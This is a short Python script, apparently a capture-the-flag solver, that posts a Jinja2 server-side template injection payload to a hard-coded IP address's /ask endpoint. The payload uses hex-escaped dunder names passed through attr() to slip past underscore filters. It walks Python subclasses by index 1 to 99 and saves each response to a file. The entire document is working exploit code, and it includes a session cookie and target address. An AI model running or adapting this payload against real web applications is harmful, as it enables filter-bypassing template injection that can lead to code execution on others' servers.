import requests

cookies = {
    'SL_G_WPT_TO': 'ja',
    'SL_GWPT_Show_Hide_tmp': '1',
    'SL_wptGlobTipTmp': '1',
    'session': '23221b72-caff-4240-90f8-9a8a49b5783a',
    'BL_T_PROV': '',
    'BL_D_PROV': '',
}

headers = {
    'Host': '104.248.237.208:5000',
    'Content-Length': '313',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://104.248.237.208:5000',
    'pgrade-Insecure-Requests': '1',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Referer': 'http://104.248.237.208:5000/',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
    'Connection': 'close',
}

for i in range(1, 100, 1):
    data = 'q=%7B%7B+self+%7C+attr%28%27%5Cx5f%5Cx5fclass%5Cx5f%5Cx5f%27+%7C+string%29+%7C+attr%28%27%5Cx5f%5Cx5fmro%5Cx5f%5Cx5f%27+%7C+string%29+%7C+last+%7C+attr%28%27%5Cx5f%5Cx5fsubclasses%5Cx5f%5Cx5f%27+%7C+string%29%28%29+%7C+attr%28%27pop%27%29%28' + str(i) + '%29+%7C+attr%28%27%5Cx5f%5Cx5fdoc%5Cx5f%5Cx5f%27+%7C+string%29+%7D%7D'
    response = requests.post('http://104.248.237.208:5000/ask', headers=headers, cookies=cookies, data=data, verify=False)
    print response.text
    filename = str(i) + '.html'
    with open(filename, 'w') as fw:
        fw.write(response.text)

